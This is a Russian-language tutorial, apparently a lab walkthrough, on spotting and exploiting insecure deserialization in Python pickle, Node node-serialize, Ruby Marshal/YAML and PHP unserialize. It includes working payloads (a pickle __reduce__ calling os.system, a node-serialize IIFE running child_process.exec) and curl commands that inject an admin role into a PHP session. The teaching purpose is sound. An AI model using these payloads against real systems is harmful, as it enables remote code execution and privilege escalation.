## Задача

**Десериализация** — превращение байтов обратно в объект. Это удобно, но опасно: если данные пришли от пользователя, а код превращает их в объекты, можно подсунуть объект, который при «оживлении» выполнит код. Опасность выглядит по-разному в каждом языке, и её важно **распознавать по формату блоба**.

Разберём четыре стека — Python, Node.js, Ruby и PHP — на одном приложении, которое шлёт нам состояние в cookie.

## Наш пример: cookie `cart` в base64

Интернет-магазин хранит корзину в cookie, закодированной в base64:

```bash
$ echo 'gASVHwAAAAAAAACMCF9fbWFpbl9f' | base64 -d | xxd | head -2
00000000: 8004 951f 0000 0000 0000 8c08 5f5f 6d61  ..............__ma
00000010: 696e 5f5f                                in__
```

Байты начинаются с `80 04` (`\x80\x04`) — это сигнатура **Python pickle** (протокол 4). Мы сразу понимаем: сервер делает `pickle.loads(base64.b64decode(cookie))`. Дальше ищем, как это превратить в выполнение кода.

## Шаг 1: Python pickle — магический `__reduce__`

`pickle` умеет восстанавливать объекты через метод `__reduce__`: он возвращает пару «функция + аргументы», которую pickle вызовет при загрузке. Этого достаточно для RCE:

```python
import pickle, base64, os
class P:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(P())).decode())
# gASVHwAAAAAAAACMCF9fbWFpbl9f ... -> отправим в cookie cart
```

Когда сервер вызовет `pickle.loads`, сработает `os.system('id')`. Это и есть Python-deser RCE.

## Шаг 2: Node.js — `node-serialize` и IIFE

В Node опасен модуль `node-serialize`: он восстанавливает функции из строки через `eval`. Признак — JSON-строка, в которой значение начинается с `_$$ND_FUNC$$_`:

```javascript
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)})}()"}
```

Ключевая деталь — **`()`** в конце: функция должна быть самовызывающейся (IIFE), тогда она выполнится сразу при `unserialize`. Ищи в JSON подозрительные строки с `function` и `_$$ND_FUNC$$_`.

## Шаг 3: Ruby — `Marshal` и YAML

Ruby сериализует объекты через `Marshal` (бинарный, сигнатура `\x04\x08`) или через YAML (`--- !ruby/object:...`). Опасен `YAML.load` — он может инстанцировать произвольные классы. Классика — гаджеты на базе `Gem::Requirement` и `Gem::Installer`:

```bash
$ echo 'BAh7...' | xxd | head -1
00000000: 0408 3a06 4053 6574 3a0a 4062 6163 6b65  ..:.@Set:.@backe
```

Сигнатура `04 08` говорит о Marshal. Дальше собирают цепочку из доступных гемов.

## Шаг 4: PHP — `unserialize` и magic-методы

PHP-объект в строке выглядит как `O:8:"ClassName":1:{...}`. Опасность — **magic-методы**: `__wakeup`, `__destruct`, `__toString` вызываются автоматически при десериализации и могут запустить цепочку:

```php
O:8:"UserProfile":2:{s:4:"file";s:8:"/etc/passwd";s:4:"role";s:5:"admin";}
```

Проверить, что это PHP, можно по строке `O:` и кавычкам:

```bash
$ curl -s https://shop.local/cart | grep -oE 'O:[0-9]+:"[A-Za-z]+"'
O:8:"UserProfile"
```

Дальше строят **gadget-цепочку** (PHAR/PHPGGC) из классов фреймворка — от `__destruct` к записи файла или RCE.

## Шаг 5: как распознать стек по блобу

| Язык | Сигнатура | Инструмент |
|------|-----------|-----------|
| Python | `\x80\x04` / base64 `gASV` | pickle |
| Node.js | `_$$ND_FUNC$$_` | node-serialize |
| Ruby | `\x04\x08` (Marshal), `!ruby/` (YAML) | Marshal/YAML |
| PHP | `O:N:"Class"` | unserialize/PHAR |

Правило: **сначала распознай формат, потом ищи гаджеты.** Эксплойт от одного языка не сработает на другом.

## Если не сработало

- **pickle отклонён** — проверь, не JSON ли это на самом деле; иногда `pickle` прячется под base64 URL-safe.
- **Node `eval` вырезан** — ищи другие прототипные гаджеты (`__proto__`).
- **Ruby `YAML.safe_load`** — старые версии всё равно уязвимы; проверь версию.
- **PHP нет гаджетов** — ищи `phar://`-триггер (десериализация PHAR-метаданных при работе с файлами).

## Что мы теперь знаем

- Десериализация опасна тем, что «оживляет» объекты и вызывает методы.
- Формат блоба выдаёт язык: pickle, node-serialize, Marshal/YAML, PHP.
- Python ломается через `__reduce__`, Node — через IIFE, Ruby — через `YAML.load`, PHP — через magic-методы.
- Сначала распознавание формата, потом гаджеты — в этом порядке.

## Частые вопросы

**Чем десериализация отличается от обычного парсинга?** Парсинг даёт **данные**, десериализация — **объекты** с методами. Опасность в том, что методы вызываются автоматически при восстановлении.

**Почему нельзя просто запретить опасные классы?** Список всегда неполон, а в classpath приложения есть библиотеки с «гаджетами». Поэтому фильтр классов часто обходят.

**Как безопасно подтвердить десериализацию?** Заставь сервер сделать **DNS-запрос** к твоему домену (без выполнения команд) — это детектор без риска.

**Всегда ли нужен RCE?** Нет. Иногда достаточно прочитать файл или повысить роль. Но десериализация чаще всего ведёт к RCE, поэтому её и ценят высоко.

**Что общего у всех языков?** Идея одна: пользовательские байты становятся объектом, а объект вызывает методы. Меняется только формат и набор гаджетов.

**Как не перепутать форматы?** По сигнатуре: `80 04` (pickle), `_$$ND_FUNC$$_` (Node), `04 08` (Marshal), `O:N:"Class"` (PHP).

## Ещё один сценарий: PHP-сессия и расхождение форматов

В PHP формат сериализации сессии задаётся `session.serialize_handler`. Если на запись один формат, а на чтение другой, получается инъекция в `$_SESSION`:

```bash
$ curl -s https://shop.local/profile -b 'PHPSESSID=x' 
# приложение пишет: user|s:5:"alice";role|s:4:"user";
# а читает в формате php_serialize: a:2:{s:4:"user";s:5:"alice";...}
```

Подставив в своё имя `|` и сериализованный хвост, можно «дописать» себе роль:

```bash
$ curl -s -d 'user=alice|s:4:"role";s:5:"admin";' https://shop.local/profile
```

Классический PHP-трюк: разделитель `|` в формате `php` позволяет инъецировать поля сессии.

## На что смотреть дальше

- **Формат блоба.** `80 04` (pickle), `_$$ND_FUNC$$_` (Node), `04 08` (Marshal), `O:N:"Class"` (PHP).
- **Триггеры.** Не только явный `unserialize`, но и `phar://`, сессии, кэш.
- **Магические методы.** `__wakeup`, `__destruct`, `__toString` — точки входа гаджета.
- **Classpath.** Какие библиотеки загружены — от них зависит выбор цепочки.
- **Безопасный детект.** Сначала DNS-callback, потом RCE.
- **Кодировки.** Иногда payload прячется за base64/URL-encoding.
